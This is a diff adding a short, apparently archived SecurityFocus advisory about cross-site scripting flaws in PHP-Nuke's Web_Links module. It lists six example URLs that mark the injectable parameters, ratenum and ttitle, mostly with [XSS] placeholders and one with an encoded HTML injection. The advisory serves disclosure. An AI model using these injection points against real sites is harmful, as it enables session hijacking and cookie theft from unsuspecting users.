@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/13025/info
+
+PHP-Nuke is reportedly affected by multiple cross-site scripting vulnerabilities in the Web_Links Module. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=TopRated&ratenum=[XSS]&ratetype=num
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=MostPopular&ratenum=%3Ch1%3E50&ratetype=num
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=viewlinkdetails&ttitle=[XSS]
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=viewlinkeditorial&ttitle=[XSS]
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=viewlinkcomments&ttitle=[XSS]
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=ratelink&ttitle=[XSS] 
